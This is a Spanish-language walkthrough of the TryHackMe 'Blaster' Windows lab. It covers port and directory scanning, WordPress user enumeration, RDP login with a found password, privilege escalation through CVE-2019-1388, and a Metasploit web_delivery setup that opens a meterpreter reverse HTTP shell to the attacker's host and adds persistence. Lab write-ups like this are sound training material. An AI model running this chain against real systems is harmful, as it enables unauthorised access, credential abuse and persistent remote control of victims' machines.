# Maquina Blaster - Tryhackme

* Nivel : Easy
* Máquina : Windows
* Ip Maquina : 10.10.54.92

## Escaneo de puertos

```bash
sudo nmap -A -sV -O -T4 -p- -Pn 10.10.54.92
```
```bash
Nmap scan report for 10.10.241.115
Host is up (0.11s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-19T17:44:22+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-06-19T17:44:17+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-06-18T17:36:52
|_Not valid after:  2025-12-18T17:36:52
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   151.96 ms 10.21.0.1
2   152.52 ms 10.10.241.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.80 seconds
```

Hay 2 puertos abiertos.

## Escaneo de vulnerabilidades web

En el puerto 80 , aparece un IIS de windows convencional. Que no parece haber nada. Aré uso de la herramietna Fuzz para buscar rutas o archivos.

### FUZZ
```bash
sudo ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.54.92/FUZZ -e .php,.html,.bak,.txt
```
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.54.92/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Extensions       : .php .html .bak .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

retro                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 139ms]
:: Progress: [102345/102345] :: Job [1/1] :: 662 req/sec :: Duration: [0:02:30] :: Errors: 0 ::
```

El fuff ha encontrado el directorio retro, ahora utilizar otra vez el fuzz pero con el directorio retro.

```bash
sudo ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.54.92/retro/FUZZ -e .php,.html,.bak,.txt
```
```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.241.115/retro/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Extensions       : .php .html .bak .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

LICENSE.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 59ms]
README.html             [Status: 200, Size: 7447, Words: 761, Lines: 99, Duration: 50ms]
Readme.html             [Status: 200, Size: 7447, Words: 761, Lines: 99, Duration: 53ms]
Index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1432ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 1407ms]
license.txt             [Status: 200, Size: 19935, Words: 3334, Lines: 386, Duration: 52ms]
readme.html             [Status: 200, Size: 7447, Words: 761, Lines: 99, Duration: 48ms]
wp-admin                [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 51ms]
wp-content              [Status: 301, Size: 161, Words: 9, Lines: 2, Duration: 54ms]
wp-includes             [Status: 301, Size: 162, Words: 9, Lines: 2, Duration: 69ms]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1403ms]
wp-login.php            [Status: 200, Size: 2743, Words: 152, Lines: 69, Duration: 1404ms]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 1479ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1411ms]
:: Progress: [102345/102345] :: Job [1/1] :: 800 req/sec :: Duration: [0:02:33] :: Errors: 0 :
```
El FFuf ha encotrado la ruta donde hay un wordpress. 

## Escaneo del Wordpress

Ahora utilizaré la herramienta wpscan para hacer una enumeración de usuarios. 

```bash
wpscan --url http://10.10.54.92 --enumerate u
```
```bahs
[i] User(s) Identified:

[+] wade
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.54.92/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Wade
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```
A encontrado wade como user.

La password se encuentra buscando en la web, esta en la ruta /retro/index.php/2019/12/09/ready-player-one/, en un comentario de wade. 

![Imagen Panel](img/Blaster)
## Acceso remoto

Una vez dentro de WordPress, ya sabemos que el usuario y la contraseña funcionan. Ahora, como es un sistema Windows, probaré a entrar por RDP utilizando la herramienta rdesktop, que permite conectarse de forma remota a la máquina Windows.

```bash
rdesktop -u wade -p parzival 10.10.54.92
```
Se abrirá una pantalla, que es el escritorio de wade. En el escritorio hay un txt con una flag. Ahora escalar a administrador.

## Escalar a administrador

En el buscador hay una CVE el CVE-2019-1388, con esto toca buscar información de cual es la vulnerabilidad.

En el escritorio de wade abrir el archivo hhupd

![Imagen Panel](img/EscritorioWade)

Una vez abierta show more details

![Imagen Panel](img/hhdp1)

![Imagen Panel](img/hhdp2)

![Imagen Panel](img/hhdp3)

File y save as

![Imagen Panel](img/hhdp4)

Saldra un error, le damos ok

![Imagen Panel](img/hhdp5)

Escribir

![Imagen Panel](img/hhdp6)

Buscar cmd en la parte superior
![Imagen Panel](img/hhdp7)

Open y nos dara la terminal, con permisos de administrador. Con esto buscar la flag.
![Imagen Panel](img/hhdp8)

Flag
![Imagen Panel](img/hhdp9)

## Terminal con metasploit

En tryhackme propone usar un exploit para abrir una terminal desde nuestro linux. Primero abrir metasploit con:

```bash
msfconsole
```
```bash
use exploit/multi/script/web_delivery
```
Como es una maquina windows mirar los targets del exploit y escoger el psh
```bash
show targets
set targets 2
```
Ahora poner la ip nuestra, la del vpn, y el puerto 80 o 443
```bash
set LHOST 10.21.95.220
set LPORT 80
```
Poner un payload

```bash
set payload windows/meterpreter/reverse_http
```
Y ejecutar con:  run -j

El metasploit generara un comando que hay que enganchar en el powershell del windows victima. Se establecera una conexión
![Imagen Panel](img/mtpBlaster)

## Mantener la conexión

Para ejecutar el exploit
```bash
run persistence -X
```









